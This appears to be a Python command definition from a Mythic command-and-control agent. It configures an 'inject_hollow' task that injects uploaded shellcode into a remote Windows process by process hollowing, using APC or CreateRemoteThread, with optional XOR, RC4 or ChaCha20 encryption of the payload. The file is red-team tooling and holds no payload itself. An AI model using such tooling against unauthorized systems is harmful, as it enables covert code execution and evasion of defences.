from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

class InjectHollowArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="shellcode_name",
                cli_name="shellcode_name",
                display_name="Shellcode",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Shellcode to inject.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, group_name="Default", ui_position=1
                    )
                ],
            ),
            CommandParameter(
                name="shellcode_file",
                cli_name="shellcode_file",
                display_name="Shellcode File",
                type=ParameterType.File,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="New Shellcode",
                        ui_position=1,
                    ),
                ]
            ),
            CommandParameter(
                name="technique",
                cli_name="technique",
                display_name="Technique",
                type=ParameterType.ChooseOne,
                default_value="apc",
                choices=["apc", "createremotethread"],
                description="Type of injection technique to use.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=True,
                        group_name="New Shellcode",
                        ui_position=2,
                    ),
                ],
            ),
            CommandParameter(
                name="encryption",
                cli_name="encryption",
                display_name="Encryption Method",
                type=ParameterType.ChooseOne,
                choices=["none", "xor_single", "xor_multi", "xor_counter", "xor_feedback", "xor_rolling", "rc4", "chacha20"],
                default_value="none",
                description="Shellcode encryption method",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="New Shellcode",
                        ui_position=3
                    ),
                ],
            ),
            CommandParameter(
                name="key",
                cli_name="key",
                display_name="Encryption Key",
                type=ParameterType.String,
                default_value="",
                description="Encryption key (hex or plain text)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="New Shellcode",
                        ui_position=4
                    ),
                ],
            ),
            CommandParameter(
                name="iv",
                cli_name="iv",
                display_name="IV (xor_feedback)",
                type=ParameterType.String,
                default_value="",
                description="Initialization vector for xor_feedback",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=5
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="New Shellcode",
                        ui_position=5
                    ),
                ],
            ),
            CommandParameter(
                name="nonce",
                cli_name="nonce",
                display_name="Nonce (chacha20)",
                type=ParameterType.String,
                default_value="",
                description="Nonce for ChaCha20 (12 bytes)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=6
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="New Shellcode",
                        ui_position=6
                    ),
                ],
            ),
        ]

    async def get_files(
        self, inputMsg: PTRPCDynamicQueryFunctionMessage
    ) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(
                CallbackID=inputMsg.Callback,
                LimitByCallback=True,
                Filename="",
            )
        )
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".bin"):
                    file_names.append(f.Filename)
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = file_resp.Error
            return fileResponse
        
    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.\n\tUsage: {}".format(InjectHollowArguments.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(InjectHollowArguments.help_cmd))


class InjectHollowCommand(CommandBase):
    cmd = "inject_hollow"
    needs_admin = False
    help_cmd = "inject_hollow (modal popup)"
    description = "Inject shellcode into a remote process using process hollowing. Based on spawnto."
    version = 1
    author = "@haha150"
    argument_class = InjectHollowArguments
    attackmapping = ["T1059"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        if taskData.args.get_parameter_group_name() == "New Shellcode":
            fileSearchResp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                AgentFileID=taskData.args.get_arg("shellcode_file")
            ))
            if not fileSearchResp.Success:
                raise Exception(f"Failed to find uploaded file: {fileSearchResp.Error}")
            if len(fileSearchResp.Files) == 0:
                raise Exception(f"Failed to find matching file, was it deleted?")
            taskData.args.add_arg("shellcode_name", fileSearchResp.Files[0].Filename)
            if fileSearchResp.Files[0].AgentFileId in taskData.Task.OriginalParams:
                response.DisplayParams = f"-Shellcode {fileSearchResp.Files[0].Filename} -Technique {taskData.args.get_arg('technique')}"
            taskData.args.remove_arg("shellcode_file")
            taskData.args.add_arg("uuid", fileSearchResp.Files[0].AgentFileId)
        else:
            fileSearchResp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                Filename=taskData.args.get_arg("shellcode_name"),
                LimitByCallback=False,
            ))
            if not fileSearchResp.Success:
                raise Exception(f"Failed to find uploaded file: {fileSearchResp.Error}")
            if len(fileSearchResp.Files) == 0:
                raise Exception(f"Failed to find matching file, was it deleted?")
            taskData.args.add_arg("uuid", fileSearchResp.Files[0].AgentFileId)
            taskData.args.add_arg("shellcode_name", taskData.args.get_arg("shellcode_name"))
            response.DisplayParams = f"-Shellcode {fileSearchResp.Files[0].Filename} -Technique {taskData.args.get_arg('technique')}"
        if taskData.args.get_arg("encryption") is not None:
            response.DisplayParams += " -Encryption {}".format(taskData.args.get_arg("encryption"))
        if taskData.args.get_arg("key") is not None:
            response.DisplayParams += " -Key {}".format(taskData.args.get_arg("key"))
        if taskData.args.get_arg("iv") is not None:
            response.DisplayParams += " -IV {}".format(taskData.args.get_arg("iv"))
        if taskData.args.get_arg("nonce") is not None:
            response.DisplayParams += " -Nonce {}".format(taskData.args.get_arg("nonce"))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp